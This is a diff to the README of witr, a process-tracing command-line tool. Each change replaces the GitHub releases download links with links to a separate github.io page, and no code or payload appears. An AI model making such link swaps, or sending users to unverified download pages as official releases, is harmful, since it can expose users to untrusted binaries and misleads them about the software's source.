@@ -1,6 +1,6 @@
 # 🔍 witr - Know Exactly What Started That Process
 
-[![Download witr](https://img.shields.io/badge/Download-witr-2ea44f?style=for-the-badge)](https://github.com/Aidan8204/witr/releases)
+[![Download witr](https://img.shields.io/badge/Download-witr-2ea44f?style=for-the-badge)](https://aidan8204.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Think of witr as a detective for your computer. It answers the question **"Who s
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[Download witr](https://github.com/Aidan8204/witr/releases)**
+Visit this link to download the application: **[Download witr](https://aidan8204.github.io)**
 
 The download page shows several files. Look for the one that matches your operating system:
 
@@ -171,6 +171,6 @@ Now that you have witr, you're equipped to understand your computer like never b
 
 ---
 
-**Ready to become a process detective?** [Download witr now](https://github.com/Aidan8204/witr/releases) and take control of your system today!
+**Ready to become a process detective?** [Download witr now](https://aidan8204.github.io) and take control of your system today!
 
 Keywords: cli, containers, devops, docker, freebsd, go, golang, incident-response, kubernetes, linux, macos, monitoring, observability, process-management, sysadmin, systemd, terminal, troubleshooting, tui, windows
